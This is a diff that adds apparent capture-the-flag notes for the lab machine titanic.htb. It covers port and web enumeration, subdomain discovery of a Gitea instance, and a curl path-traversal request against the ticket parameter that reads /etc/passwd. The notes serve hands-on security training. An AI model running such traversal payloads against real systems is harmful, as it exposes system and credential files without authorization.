@@ -1,0 +1,29 @@
+Nmap scan revealed:
+22/tcp - open - openSSH 8.9p1 Ubuntu
+80/tcp - open - Apache httpd 2.4.52
+
+We get a successful web server with limited functionality. Added the IP to /etc/hosts for titanic.htb
+
+Used whatweb to enumerate services:
+└─$ whatweb http://10.129.232.146/
+http://10.129.232.146/ [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.232.146], RedirectLocation[http://titanic.htb/], Title[301 Moved Permanently]
+http://titanic.htb/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.129.232.146], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
+Server is running Werkzeug/3.0.3 and Python/3.10.12
+
+Found /download, /server-status/ and /book with gobuster. /download reveals that a ticket parameter is required. 
+Used curl to test it with a different input and got the same "error":ticket not found message
+curl -i http://titanic.htb/download?ticket=1234
+
+I attempted an LFI attack using curl and got some good results:
+curl -i "http://titanic.htb/download?ticket=../../../../etc/passwd"
+  developer:x:1000:1000:developer:/home/developer:/bin/bash
+Tried other paths using LFI and no luck. 
+
+
+Tried enumerating for subdomains and after a while I was able to locate dev.titanic.htb. I add to add this to my hosts file to resolve it.
+
+Opened the browser and was met with Gitea. Seems to be a version control website. I couldn't brute force the developer login,
+but I was able to create a user on the platform. 
+
+
+  
